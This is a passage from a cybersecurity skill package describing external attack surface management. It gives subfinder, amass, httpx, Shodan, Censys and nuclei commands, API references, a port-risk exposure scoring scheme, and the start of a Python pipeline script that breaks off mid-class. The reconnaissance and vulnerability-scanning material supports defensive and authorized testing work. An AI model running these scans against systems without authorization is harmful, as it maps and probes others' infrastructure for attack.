

===== FILE: skills/implementing-attack-surface-management/SKILL.md =====
---
name: implementing-attack-surface-management
description: 'Implements external attack surface management (EASM) using Shodan, Censys,
  and ProjectDiscovery tools (subfinder, httpx, nuclei) for asset discovery, subdomain
  enumeration, service fingerprinting, and exposure scoring. Includes a weighted risk
  scoring algorithm based on OWASP attack surface analysis methodology and the Relative
  Attack Surface Quotient (RSQ). Use when building continuous ASM programs or performing
  external reconnaissance for security assessments.

  '
domain: cybersecurity
subdomain: offensive-security
tags:
- attack-surface
- reconnaissance
- shodan
- censys
- subfinder
- nuclei
- asset-discovery
version: '1.0'
author: mukul975
license: Apache-2.0
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1078
- T1190
- T1059
- T1595
- T1592
---

# Implementing Attack Surface Management

## When to Use

- When building an external attack surface management (EASM) program from scratch
- When performing authorized external reconnaissance for penetration testing engagements
- When continuously monitoring organizational exposure across internet-facing assets
- When scoring and prioritizing external attack surface risks for remediation
- When integrating multiple discovery tools into an automated ASM pipeline

## Prerequisites

- Python 3.8+ with requests, shodan, censys libraries installed
- Shodan API key (free tier provides 100 queries/month)
- Censys API ID and Secret (free tier available)
- ProjectDiscovery tools installed: subfinder, httpx, nuclei
- Go 1.21+ for building ProjectDiscovery tools from source
- Appropriate authorization for all external scanning activities
- Target domains and IP ranges with written scope documentation

## Instructions

### Phase 1: Subdomain Enumeration with Multiple Sources

Use subfinder for passive subdomain discovery leveraging dozens of data sources
including certificate transparency logs, DNS datasets, and search engines.

```bash
# Install ProjectDiscovery tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Basic subdomain enumeration
subfinder -d example.com -o subdomains.txt

# Verbose with all sources and recursive enumeration
subfinder -d example.com -all -recursive -o subdomains_full.txt

# Multi-domain enumeration from file
subfinder -dL domains.txt -o all_subdomains.txt

# Using OWASP Amass for deeper enumeration
amass enum -d example.com -passive -o amass_subdomains.txt

# Merge and deduplicate results
cat subdomains.txt amass_subdomains.txt | sort -u > combined_subdomains.txt
```

### Phase 2: Live Host Discovery and Service Fingerprinting

Probe discovered subdomains to identify live hosts, technologies, and services.

```bash
# HTTP probing with technology detection
cat combined_subdomains.txt | httpx -sc -cl -ct -title -tech-detect \
    -follow-redirects -json -o httpx_results.json

# Detailed service fingerprinting
cat combined_subdomains.txt | httpx -sc -cl -ct -title -tech-detect \
    -favicon -hash sha256 -jarm -cdn -cname \
    -follow-redirects -json -o httpx_detailed.json
```

### Phase 3: Shodan Asset Discovery

Query Shodan for exposed services, open ports, and known vulnerabilities
associated with discovered assets.

```python
import shodan

api = shodan.Shodan("YOUR_SHODAN_API_KEY")

# Search by organization
results = api.search("org:\"Example Corp\"")
for service in results["matches"]:
    print(f"{service['ip_str']}:{service['port']} - {service.get('product', 'unknown')}")
    if service.get("vulns"):
        for cve in service["vulns"]:
            print(f"  CVE: {cve}")

# Search by hostname
results = api.search("hostname:example.com")

# Search by SSL certificate
results = api.search("ssl.cert.subject.cn:example.com")

# Get host details with all services
host = api.host("93.184.216.34")
print(f"IP: {host['ip_str']}")
print(f"Ports: {host['ports']}")
print(f"Vulns: {host.get('vulns', [])}")
```

### Phase 4: Censys Asset Discovery

Use Censys to discover internet-facing assets through certificate and host search.

```python
from censys.search import CensysHosts, CensysCerts

# Host search
hosts = CensysHosts()
query = hosts.search("services.tls.certificates.leaf.subject.common_name: example.com")
for page in query:
    for host in page:
        print(f"IP: {host['ip']}")
        for service in host.get("services", []):
            print(f"  Port: {service['port']} Protocol: {service['transport_protocol']}")
            print(f"  Service: {service.get('service_name', 'unknown')}")

# Certificate transparency search
certs = CensysCerts()
query = certs.search("parsed.names: example.com")
for page in query:
    for cert in page:
        print(f"Fingerprint: {cert['fingerprint_sha256']}")
        print(f"Names: {cert.get('parsed', {}).get('names', [])}")
```

### Phase 5: Vulnerability Scanning with Nuclei

Run targeted vulnerability scans against discovered assets using Nuclei templates.

```bash
# Update nuclei templates
nuclei -ut

# Scan with all templates
cat combined_subdomains.txt | httpx -silent | nuclei -o nuclei_results.txt

# Scan with specific severity
cat combined_subdomains.txt | httpx -silent | \
    nuclei -severity critical,high -o critical_findings.txt

# Scan with specific template categories
cat combined_subdomains.txt | httpx -silent | \
    nuclei -tags cve,misconfig,exposure -o categorized_findings.txt

# Scan for exposed panels and sensitive files
cat combined_subdomains.txt | httpx -silent | \
    nuclei -tags panel,exposure,config -o exposed_panels.txt
```

### Phase 6: Exposure Scoring Algorithm

Score each asset based on OWASP attack surface analysis principles, using
a weighted formula derived from the Relative Attack Surface Quotient (RSQ)
and damage-potential-to-effort ratio.

The scoring algorithm considers:
1. **Open ports and services** - weighted by service risk (management ports score higher)
2. **Known vulnerabilities** - weighted by CVSS score
3. **Technology age** - outdated software increases score
4. **Exposure level** - internet-facing vs. authenticated access
5. **Data sensitivity** - based on service type and content indicators

```python
# Exposure Score = sum of weighted factors, normalized to 0-100
# See agent.py for the full implementation
```

## Examples

```bash
# Run complete ASM pipeline against a target domain
python agent.py \
    --domain example.com \
    --action full_scan \
    --shodan-key YOUR_KEY \
    --censys-id YOUR_ID \
    --censys-secret YOUR_SECRET \
    --output asm_report.json

# Subdomain enumeration only
python agent.py \
    --domain example.com \
    --action enumerate \
    --output subdomains.json

# Exposure scoring on previously discovered assets
python agent.py \
    --domain example.com \
    --action score \
    --input previous_scan.json \
    --output scored_assets.json

# Multi-domain scan from file
python agent.py \
    --domain-list targets.txt \
    --action full_scan \
    --output multi_domain_report.json
```

===== END FILE =====


===== FILE: skills/implementing-attack-surface-management/LICENSE =====
                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   Copyright 2025 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-attack-surface-management/references/api-reference.md =====
# Attack Surface Management Tooling API Reference

This skill combines several external attack-surface tools. This reference documents the APIs/SDKs/CLIs for each: **Shodan**, **Censys**, and the **ProjectDiscovery** suite (`subfinder`, `httpx`, `nuclei`).

---

## 1. Shodan

### Authentication
Single API key, passed to the SDK constructor or `key` query parameter. Get it from the account page (https://account.shodan.io). The key encodes your plan and query credits.

```python
import shodan
api = shodan.Shodan("YOUR_SHODAN_API_KEY")
```
REST base URL: `https://api.shodan.io`. Key is sent as `?key=YOUR_KEY`.

### Key Methods / Endpoints
| SDK method | REST endpoint | Description | Parameters |
|---|---|---|---|
| `api.host(ip)` | `GET /shodan/host/{ip}` | All services/banners for one IP | `ip`, `history`, `minify` |
| `api.search(query)` | `GET /shodan/host/search` | Search the banner index | `query`, `page`, `facets`, `minify` |
| `api.count(query)` | `GET /shodan/host/count` | Result count + facets, **no query credits** | `query`, `facets` |
| `api.search_cursor(query)` | — | Generator that auto-paginates all results | `query`, `minify` |
| `api.scan(ips)` | `POST /shodan/scan` | Request on-demand scan of IPs/netblocks | `ips` |
| `api.dns.resolve(hosts)` | `GET /dns/resolve` | Hostname → IP | `hostnames` |
| `api.dns.reverse(ips)` | `GET /dns/reverse` | IP → hostname | `ips` |
| `api.info()` | `GET /api-info` | Remaining query/scan credits, plan | — |
| `api.exploits.search(q)` | (Exploits API) | Search Exploit DB / CVE / Metasploit | `query`, `facets` |

Search filters used in `query`: `org:`, `hostname:`, `net:`, `port:`, `ssl.cert.subject.cn:`, `ssl:`, `product:`, `vuln:`, `country:`, `http.title:`.

### Python SDK
```python
# pip install shodan
import shodan
api = shodan.Shodan("YOUR_SHODAN_API_KEY")

# Cheap count first (no query credit consumed)
print(api.count('org:"Example Corp"')["total"])

# Full search with vuln extraction
for svc in api.search('org:"Example Corp"')["matches"]:
    print(svc["ip_str"], svc["port"], svc.get("product"))
    for cve in svc.get("vulns", []):
        print("  ", cve)

# Per-host deep lookup
host = api.host("93.184.216.34")
print(host["ports"], host.get("vulns", []))
```

### Common Response Fields
`matches[]` items: `ip_str`, `port`, `transport`, `product`, `version`, `hostnames`, `org`, `isp`, `location` (`country_code`, `city`), `data` (raw banner), `vulns` (list of CVE IDs), `ssl`, `http`, `timestamp`.

### Rate Limits
- **1 request/second** is the hard REST API rate limit across the account (the SDK paces `search_cursor`).
- **Query credits**: 1 query credit is deducted per 100 results/pages of search (or per page of domain info). Every credit yields up to 100 results. **IP lookups (`host()`) and `count()` do NOT consume query credits.** Shodan Membership = 100 query credits/month; paid API plans range from 10,000 up to unlimited. Credits reset at the start of each month.
- **Scan credits**: separate monthly budget consumed by `api.scan()` — 1 scan credit per host requested.

### Error Codes
`401` invalid API key · `403` access denied / plan lacks feature · `429` rate-limit or out of credits · `404` IP not found in index. SDK raises `shodan.APIError` with the message.

### Resources
- API docs: https://developer.shodan.io/api
- Python lib: https://shodan.readthedocs.io
- Search filters: https://www.shodan.io/search/filters

---

## 2. Censys (Platform API)

### Authentication
Censys Platform uses a **Personal Access Token (PAT)** plus an **Organization ID** (the legacy Search API used an API ID + Secret with HTTP Basic auth). Configure via env vars `CENSYS_API_ID` / `CENSYS_API_SECRET` (legacy) or the Platform token. Credentials from https://platform.censys.io.

```python
from censys.search import CensysHosts   # legacy search SDK
hosts = CensysHosts()   # reads CENSYS_API_ID / CENSYS_API_SECRET from env
```

### Key Methods / Endpoints
| SDK | Description | Parameters |
|---|---|---|
| `CensysHosts().search(query)` | Search the hosts dataset (returns a paginated query object) | `query`, `per_page`, `pages`, `fields`, `sort` |
| `CensysHosts().view(ip)` | Full record for one host | `ip`, `at_time` |
| `CensysHosts().aggregate(query, field)` | Faceted aggregation/report | `query`, `field`, `num_buckets` |
| `CensysCerts().search(query)` | Search the certificates dataset | `query`, `per_page`, `pages` |
| `CensysCerts().view(fingerprint)` | Full cert record | `fingerprint` (SHA-256) |

Query language (Censys Query Language / CenQL) examples: `services.tls.certificates.leaf_data.subject.common_name: example.com`, `services.port: 443`, `services.service_name: HTTP`, `location.country: "United States"`.

### Python SDK
```python
# pip install censys
from censys.search import CensysHosts, CensysCerts

hosts = CensysHosts()
for page in hosts.search(
        "services.tls.certificates.leaf_data.subject.common_name: example.com",
        per_page=100, pages=2):
    for host in page:
        print(host["ip"])
        for s in host.get("services", []):
            print("  ", s["port"], s.get("service_name"))

certs = CensysCerts()
for page in certs.search("parsed.names: example.com"):
    for c in page:
        print(c["fingerprint_sha256"])
```

### Common Response Fields
Host: `ip`, `services[]` (`port`, `service_name`, `transport_protocol`, `software`, `tls`), `location`, `autonomous_system`, `dns`, `operating_system`.
Cert: `fingerprint_sha256`, `parsed.names`, `parsed.subject`, `parsed.issuer`, `parsed.validity`.

### Rate Limits
Tiered by plan. Free/community tier is limited (low queries/month and a modest requests-per-second cap); paid Platform tiers raise both. `429 Too Many Requests` when exceeded — the SDK backs off and retries.

### Error Codes
`401` bad credentials · `403` plan restriction · `404` not found · `422` malformed query · `429` rate limit.

### Resources
- Platform docs: https://docs.censys.com/
- Python SDK: https://censys-python.readthedocs.io
- CenQL reference: https://docs.censys.com/docs/censys-query-language

---

## 3. ProjectDiscovery Suite (CLI tools)

These are Go CLI tools, not REST APIs. They read stdin / files and write JSON. (ProjectDiscovery Cloud / `pdcp` offers a hosted API with an `PDCP_API_KEY`, but the core engines run locally and need no key.)

### Installation
```bash
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

### subfinder — passive subdomain enumeration
| Flag | Purpose |
|---|---|
| `-d <domain>` | Target domain |
| `-dL <file>` | List of domains |
| `-all` | Use all sources (some need API keys in `~/.config/subfinder/provider-config.yaml`) |
| `-recursive` | Recursive enumeration |
| `-o <file>` / `-oJ` | Output file / JSON lines |
| `-silent` | Only output subdomains |
Provider keys (Shodan, Censys, VirusTotal, SecurityTrails, etc.) go in the provider config to expand passive sources.

### httpx — HTTP probing / fingerprinting
| Flag | Purpose |
|---|---|
| `-sc` | Status code |
| `-cl` | Content length |
| `-ct` | Content type |
| `-title` | Page title |
| `-tech-detect` | Wappalyzer tech fingerprint |
| `-favicon` / `-hash sha256` | Favicon hash / body hash |
| `-jarm` | JARM TLS fingerprint |
| `-cdn` / `-cname` | CDN + CNAME detection |
| `-json` / `-o` | JSON output / file |
| `-rl <n>` | Rate limit (requests/sec) |

### nuclei — template-based vulnerability scanning
| Flag | Purpose |
|---|---|
| `-u <url>` / `-l <file>` | Target(s) |
| `-t <path>` | Specific template(s) |
| `-tags <tags>` | Filter by tag (`cve,misconfig,exposure,panel`) |
| `-severity <levels>` | `critical,high,medium,low,info` |
| `-ut` / `-update-templates` | Update the template store |
| `-rl <n>` / `-c <n>` | Rate limit / concurrency |
| `-o` / `-json` / `-jsonl` | Output |

### Pipeline example
```bash
subfinder -d example.com -all -silent \
  | httpx -silent -tech-detect -json -o live.json
cat live.json | jq -r '.url' \
  | nuclei -severity critical,high -tags cve,exposure -jsonl -o findings.jsonl
```

### Rate Limits
No vendor-imposed API rate limit for local execution — you control load with `-rl` (requests/sec) and `-c` (concurrency). Respect target scope/authorization and any provider key limits (Shodan 1 req/s, Censys/SecurityTrails monthly quotas) consumed via subfinder's passive sources.

### Resources
- subfinder: https://github.com/projectdiscovery/subfinder
- httpx: https://github.com/projectdiscovery/httpx
- nuclei: https://github.com/projectdiscovery/nuclei
- nuclei templates: https://github.com/projectdiscovery/nuclei-templates
- ProjectDiscovery docs: https://docs.projectdiscovery.io/

---

## Scoring Methodology Note
The skill's exposure score derives from OWASP Attack Surface Analysis and the Relative Attack Surface Quotient (RSQ), weighting open management ports, CVSS-scored known vulns, software age, internet exposure, and data sensitivity. None of these scoring inputs require an external API beyond the discovery data gathered above (Shodan `vulns`, nuclei CVE matches, httpx tech-detect).

===== END FILE =====


===== FILE: skills/implementing-attack-surface-management/references/asm-reference.md =====
# Reference: Attack Surface Management

## Exposure Scoring Algorithm

### Weighted Formula

The exposure score uses a weighted composite of five factors, each normalized to 0-100:

```
Exposure Score = (Port_Score * 0.25) + (Vuln_Score * 0.30) + (Tech_Score * 0.15)
               + (Exposure_Score * 0.15) + (Data_Score * 0.15)
```

### Component Scoring

**Open Ports (25% weight)**
- Each port has a risk weight from PORT_RISK_WEIGHTS (1.0-9.5)
- Management ports (SSH, RDP, Telnet): 8.0-9.5
- Database ports (MySQL, MongoDB, Redis): 9.0-9.5
- Web ports (HTTP, HTTPS): 2.5-3.0
- Formula: `min(100, (avg_weight * 10) * log2(count + 1))`

**Vulnerabilities (30% weight)**
- Weighted by CVSS score bands: Critical=10, High=7, Medium=4, Low=2
- Diminishing returns via logarithmic scaling
- Formula: `min(100, total_weight * log2(count + 1))`

**Technology Risk (15% weight)**
- Known high-risk technologies scored 2.0-8.0
- Struts (8.0), phpMyAdmin (8.0), WebLogic (7.0), Jenkins (7.0)
- Unknown technologies get baseline score of 10.0

**Exposure Level (15% weight)**
- Base score 50 for internet-facing
- HTTP-only: +15 | CDN protected: -20
- Auth required (401/403): -25
- Admin/login panel detected: +20

**Data Sensitivity (15% weight)**
- Exposed database ports: +20 each
- File sharing ports (FTP, SMB): +15 each
- Sensitive service indicators: +15 each

### Risk Levels

| Score Range | Risk Level |
|-------------|------------|
| 80-100 | CRITICAL |
| 60-79 | HIGH |
| 40-59 | MEDIUM |
| 20-39 | LOW |
| 0-19 | INFORMATIONAL |

## OWASP Attack Surface Analysis

### Entry Points to Catalog

Per OWASP Attack Surface Analysis Cheat Sheet:
- Network-accessible ports and services
- Web application endpoints and parameters
- Authentication mechanisms
- File upload functions
- Administrative interfaces
- API endpoints
- Form fields and query parameters

### Relative Attack Surface Quotient (RSQ)

Microsoft's RSQ methodology counts:
1. **Channels**: TCP/UDP ports, RPC endpoints, named pipes
2. **Methods**: HTTP verbs, RPC methods, API functions
3. **Data Items**: Files, registry keys, database records

RSQ = sum of (damage_potential / effort) for each attack vector

## Shodan Search Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `hostname:` | Search by hostname | `hostname:example.com` |
| `org:` | Search by organization | `org:"Example Corp"` |
| `net:` | Search by CIDR | `net:93.184.216.0/24` |
| `port:` | Filter by port | `port:3389` |
| `product:` | Filter by product | `product:nginx` |
| `os:` | Filter by OS | `os:"Windows Server 2019"` |
| `ssl.cert.subject.cn:` | SSL cert CN | `ssl.cert.subject.cn:example.com` |
| `vuln:` | Search by CVE | `vuln:CVE-2021-44228` |
| `country:` | Filter by country | `country:US` |
| `has_vuln:true` | Has known vulns | `hostname:example.com has_vuln:true` |

## Censys Search Syntax

| Query | Description |
|-------|-------------|
| `services.port: 443` | Hosts with port 443 open |
| `services.tls.certificates.leaf.subject.common_name: example.com` | SSL cert match |
| `services.http.response.html_title: "Admin"` | Page title match |
| `services.software.product: "Apache"` | Software product |
| `location.country: "United States"` | Geographic filter |
| `autonomous_system.asn: 13335` | ASN filter |

## ProjectDiscovery Tool Chain

### subfinder
Passive subdomain discovery using 50+ data sources:
- Certificate transparency (crt.sh, Certspotter)
- DNS datasets (DNSdumpster, SecurityTrails)
- Search engines (Google, Bing, Yahoo)
- Web archives (Wayback Machine, CommonCrawl)
- Shodan, Censys, VirusTotal APIs

```bash
subfinder -d example.com -all -recursive -o subs.txt
```

### httpx
HTTP toolkit for probing and fingerprinting:
- Status codes, content length, content type
- Technology detection (Wappalyzer)
- Favicon hash, JARM fingerprint
- CDN detection, CNAME resolution

```bash
cat subs.txt | httpx -sc -cl -ct -title -tech-detect -json -o httpx.json
```

### nuclei
Template-based vulnerability scanner:
- 10,000+ community templates
- Severity-based filtering
- Protocol support: HTTP, DNS, TCP, SSL, File
- Automatic template updates

```bash
cat live_hosts.txt | nuclei -severity critical,high -tags cve -o findings.txt
```

## Port Risk Classification

### Critical Exposure (Score 9.0+)
- 23 (Telnet): Unencrypted remote access
- 27017 (MongoDB): Often misconfigured without auth
- 6379 (Redis): Commonly exposed without auth
- 445 (SMB): Ransomware propagation vector

### High Exposure (Score 7.0-8.9)
- 22 (SSH): Brute force target
- 3389 (RDP): BlueKeep, credential attacks
- 3306/5432/1433 (Databases): Data exfiltration
- 21 (FTP): Anonymous access, credential theft
- 161 (SNMP): Community string exposure

### Medium Exposure (Score 4.0-6.9)
- 8080/8443 (Alt HTTP/S): Dev/staging environments
- 25 (SMTP): Open relay, spoofing
- 53 (DNS): Zone transfer, cache poisoning
- 8888 (Various): Development panels

### Low Exposure (Score 2.0-3.9)
- 80 (HTTP): Standard web
- 443 (HTTPS): Standard secure web

### References

- OWASP Attack Surface Analysis: https://cheatsheetseries.owasp.org/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html
- OWASP ASM Top 10: https://owasp.org/www-project-attack-surface-management-top-10/
- ProjectDiscovery ASM blog: https://blog.projectdiscovery.io/asm-platform-using-projectdiscovery-tools/
- Shodan API documentation: https://developer.shodan.io/api
- Censys API documentation: https://search.censys.io/api
- subfinder GitHub: https://github.com/projectdiscovery/subfinder
- nuclei GitHub: https://github.com/projectdiscovery/nuclei

===== END FILE =====


===== FILE: skills/implementing-attack-surface-management/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for implementing external attack surface management (EASM).

Combines Shodan, Censys, ProjectDiscovery tools (subfinder, httpx, nuclei),
and a custom exposure scoring algorithm for comprehensive ASM.

DISCLAIMER: This tool is intended for authorized security testing and attack
surface management only. Ensure you have written authorization before scanning
any targets. Unauthorized scanning of systems you do not own or have explicit
permission to test is illegal and unethical.
"""

import json
import subprocess
import argparse
import math
from datetime import datetime
from collections import defaultdict

try:
    import shodan
except ImportError:
    shodan = None

try:
    from censys.search import CensysHosts, CensysCerts
except ImportError:
    CensysHosts = None
    CensysCerts = None


# --------------------------------------------------------------------------- #
#  Port risk weights based on OWASP attack surface analysis methodology
# --------------------------------------------------------------------------- #
PORT_RISK_WEIGHTS = {
    # Management / remote access (highest risk)
    22: 8.0,    # SSH
    23: 9.5,    # Telnet (unencrypted)
    3389: 8.5,  # RDP
    5900: 8.0,  # VNC
    5985: 7.5,  # WinRM HTTP
    5986: 7.0,  # WinRM HTTPS
    # Web services
    80: 3.0,    # HTTP
    443: 2.5,   # HTTPS
    8080: 5.0,  # Alt HTTP (often dev/admin)
    8443: 4.5,  # Alt HTTPS
    8888: 6.0,  # Often dev panels
    # Databases (high risk if exposed)
    3306: 9.0,  # MySQL
    5432: 9.0,  # PostgreSQL
    1433: 9.0,  # MSSQL
    1521: 9.0,  # Oracle
    27017: 9.5, # MongoDB
    6379: 9.5,  # Redis
    9200: 8.5,  # Elasticsearch
    5601: 8.0,  # Kibana
    # Message queues
    5672: 7.5,  # RabbitMQ
    9092: 7.5,  # Kafka
    # File sharing
    21: 8.0,    # FTP
    445: 9.0,   # SMB
    139: 8.5,   # NetBIOS
    # Email
    25: 6.0,    # SMTP
    110: 6.5,   # POP3
    143: 6.0,   # IMAP
    # DNS
    53: 5.0,    # DNS
    # SNMP
    161: 8.0,   # SNMP
    162: 7.5,   # SNMP Trap
}

# Services that indicate sensitive data handling
SENSITIVE_SERVICE_INDICATORS = {
    "mysql", "postgresql", "mongodb", "redis", "elasticsearch",
    "oracle", "mssql", "couchdb", "cassandra", "memcached",
    "rabbitmq", "kafka", "activemq",
}

# Technologies known to have frequent vulnerabilities
HIGH_RISK_TECHNOLOGIES = {
    "apache": 3.0,
    "nginx": 2.0,
    "iis": 4.0,
    "tomcat": 5.0,
    "jboss": 6.0,
    "weblogic": 7.0,
    "wordpress": 6.0,
    "drupal": 5.0,
    "joomla": 5.5,
    "phpmyadmin": 8.0,
    "jenkins": 7.0,
    "gitlab": 5.0,
    "grafana": 4.0,
    "kibana": 5.0,
    "solr": 6.0,
    "struts": 8.0,
    "coldfusion": 7.0,
    "exchange": 7.5,
    "sharepoint": 6.0,
}


class SubdomainEnumerator:
    """Discovers subdomains using subfinder and amass."""

    def __init__(self, domain):
        self.domain = domain
        self.subdomains = set()

    def run_subfinder(self):
        """Run subfinder for passive subdomain enumeration."""
        print(f"[+] Running subfinder against {self.domain}")
        try:
            result = subprocess.run(
                ["subfinder", "-d", self.domain, "-all", "-silent"],
                capture_output=True, text=True, timeout=300,
            )
            found = set(result.stdout.strip().split("\n")) if result.stdout.strip() else set()
            self.subdomains.update(found)
            print(f"[+] subfinder found {len(found)} subdomains")
        except FileNotFoundError:
            print("[-] subfinder not installed. Install: go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
        except subprocess.TimeoutExpired:
            print("[-] subfinder timed out after 300s")
        return self.subdomains

    def run_amass(self):
        """Run amass for deeper passive enumeration."""
        print(f"[+] Running amass passive enum against {self.domain}")
        try:
            result = subprocess.run(
                ["amass", "enum", "-d", self.domain, "-passive"],
                capture_output=True, text=True, timeout=600,
            )
            found = set(result.stdout.strip().split("\n")) if result.stdout.strip() else set()
            self.subdomains.update(found)
            print(f"[+] amass found {len(found)} subdomains")
        except FileNotFoundError:
            print("[-] amass not installed. Install: go install -v github.com/owasp-amass/amass/v4/...@master")
        except subprocess.TimeoutExpired:
            print("[-] amass timed out after 600s")
        return self.subdomains

    def enumerate_all(self):
        """Run all enumeration tools and merge results."""
        self.run_subfinder()
        self.run_amass()
        self.subdomains.discard("")
        print(f"[+] Total unique subdomains: {len(self.subdomains)}")
        return sorted(self.subdomains)


class ServiceFingerprinter:
    """Probes live hosts and fingerprints services using httpx."""

    def __init__(self, subdomains):
        self.subdomains = subdomains
        self.results = []

    def run_httpx(self):
        """Run httpx for HTTP probing and technology detection."""
        if not self.subdomains:
            print("[-] No subdomains to probe")
            return []

        print(f"[+] Running httpx against {len(self.subdomains)} subdomains")
        input_data = "\n".join(self.subdomains)
        try:
            result = subprocess.run(
                [
                    "httpx", "-sc", "-cl", "-ct", "-title", "-tech-detect",
                    "-favicon", "-cdn", "-cname", "-follow-redirects",
                    "-json", "-silent",
                ],
                input=input_data,
                capture_output=True, text=True, timeout=600,
            )
            for line in result.stdout.strip().split("\n"):
                if line.strip():
                    try:
                        self.results.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
            print(f"[+] httpx found {len(self.results)} live hosts")
        except FileNotFoundError:
            print("[-] httpx not installed. Install: go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest")
        except subprocess.TimeoutExpired:
            print("[-] httpx timed out after 600s")
        return self.results


class ShodanScanner:
    """Discovers exposed services and vulnerabilities via Shodan API."""

    def __init__(self, api_key):
        if shodan is None:
            raise ImportError("pip install shodan")
        self.api = shodan.Shodan(api_key)
        self.results = []

    def search_domain(self, domain):
        """Search Shodan for all hosts associated with a domain."""
        print(f"[+] Searching Shodan for hostname:{domain}")
        try:
            results = self.api.search(f"hostname:{domain}", limit=500)
            self.results.extend(results.get("matches", []))
            print(f"[+] Shodan returned {results['total']} results")
        except shodan.APIError as e:
            print(f"[-] Shodan API error: {e}")
        return self.results

    def search_org(self, org_name):
        """Search Shodan for all hosts in an organization."""
        print(f'[+] Searching Shodan for org:"{org_name}"')
        try:
            results = self.api.search(f'org:"{org_name}"', limit=500)
            self.results.extend(results.get("matches", []))
            print(f"[+] Shodan returned {results['total']} results")
        except shodan.APIError as e:
            print(f"[-] Shodan API error: {e}")
        return self.results

    def search_ssl_cert(self, domain):
        """Search Shodan for hosts with SSL certificates matching domain."""
        print(f"[+] Searching Shodan for ssl.cert.subject.cn:{domain}")
        try:
            results = self.api.search(f"ssl.cert.subject.cn:{domain}", limit=500)
            self.results.extend(results.get("matches", []))
            print(f"[+] Shodan SSL cert search returned {results['total']} results")
        except shodan.APIError as e:
            print(f"[-] Shodan API error: {e}")
        return self.results

    def get_host_details(self, ip):
        """Get detailed information for a specific IP."""
        try:
            return self.api.host(ip)
        except shodan.APIError as e:
            print(f"[-] Shodan host lookup failed for {ip}: {e}")
            return None

    def get_all_results(self):
        """Return deduplicated results."""
        seen_ips = set()
        deduped = []
        for result in self.results:
            ip = result.get("ip_str", "")
            port = result.get("port", 0)
            key = f"{ip}:{port}"
            if key not in seen_ips:
                seen_ips.add(key)
                deduped.append(result)
        return deduped


class CensysScanner:
    """Discovers internet-facing assets through Censys host and cert search."""

    def __init__(self, api_id, api_secret):
        if CensysHosts is None:
            raise ImportError("pip install censys")
        self.hosts_api = CensysHosts(api_id=api_id, api_secret=api_secret)
        self.certs_api = CensysCerts(api_id=api_id, api_secret=api_secret)
        self.results = []

    def search_hosts(self, domain, max_pages=5):
        """Search Censys for hosts matching domain."""
        print(f"[+] Searching Censys hosts for {domain}")
        query = f"services.tls.certificates.leaf.subject.common_name: {domain}"
        try:
            count = 0
            for page in self.hosts_api.search(query, per_page=100, pages=max_pages):
                for host in page:
                    self.results.append({
                        "ip": host.get("ip"),
                        "services": host.get("services", []),
                        "location": host.get("location", {}),
                        "autonomous_system": host.get("autonomous_system", {}),
                        "source": "censys",
                    })
                    count += 1
            print(f"[+] Censys returned {count} hosts")
        except Exception as e:
            print(f"[-] Censys search error: {e}")
        return self.results

    def search_certificates(self, domain, max_pages=3):
        """Search Censys certificate transparency logs."""
        print(f"[+] Searching Censys certificates for {domain}")
        subdomains = set()
        try:
            for page in self.certs_api.search(
                f"parsed.names: {domain}", per_page=100, pages=max_pages
            ):
                for cert in page:
                    names = cert.get("parsed", {}).get("names", [])
                    for name in names:
                        if name.endswith(domain):
                            subdomains.add(name)
            print(f"[+] Censys certs revealed {len(subdomains)} subdomains")
        except Exception as e:
            print(f"[-] Censys cert search error: {e}")
        return subdomains


class VulnerabilityScanner:
    """Runs vulnerability scans using Nuclei."""

    def __init__(self, targets):
        self.targets = targets
        self.findings = []

    def run_nuclei(self, severity="critical,high", tags=None):
        """Run nuclei against targets with specified severity/tags."""
        if not self.targets:
            print("[-] No targets for nuclei scan")
            return []

        print(f"[+] Running nuclei against {len(self.targets)} targets")
        input_data = "\n".join(self.targets)
        cmd = ["nuclei", "-json", "-silent", "-severity", severity]
        if tags:
            cmd.extend(["-tags", tags])

        try:
            result = subprocess.run(
                cmd, input=input_data,
                capture_output=True, text=True, timeout=1800,
            )
            for line in result.stdout.strip().split("\n"):
                if line.strip():
                    try:
                        finding = json.loads(line)
                        self.findings.append({
                            "template_id": finding.get("template-id", ""),
                            "name": finding.get("info", {}).get("name", ""),
                            "severity": finding.get("info", {}).get("severity", ""),
                            "host": finding.get("host", ""),
                            "matched_at": finding.get("matched-at", ""),
                            "type": finding.get("type", ""),
                            "description": finding.get("info", {}).get("description", ""),
                            "tags": finding.get("info", {}).get("tags", []),
                            "reference": finding.get("info", {}).get("reference", []),
                            "cvss_score": finding.get("info", {}).get(
                                "classification", {}
                            ).get("cvss-score", 0),
                            "cve_id": finding.get("info", {}).get(
                                "classification", {}
                            ).get("cve-id", ""),
                        })
                    except json.JSONDecodeError:
                        continue
            print(f"[+] nuclei found {len(self.findings)} vulnerabilities")
        except FileNotFoundError:
            print("[-] nuclei not installed. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
        except subprocess.TimeoutExpired:
            print("[-] nuclei timed out after 1800s")
        return self.findings


class ExposureScorer:
    """Calculates exposure scores using OWASP attack surface analysis principles.

    The scoring algorithm implements a weighted formula derived from:
    - OWASP Relative Attack Surface Quotient (RSQ)
    - Carnegie Mellon damage-potential-to-effort ratio
    - CVSS-based vulnerability weighting

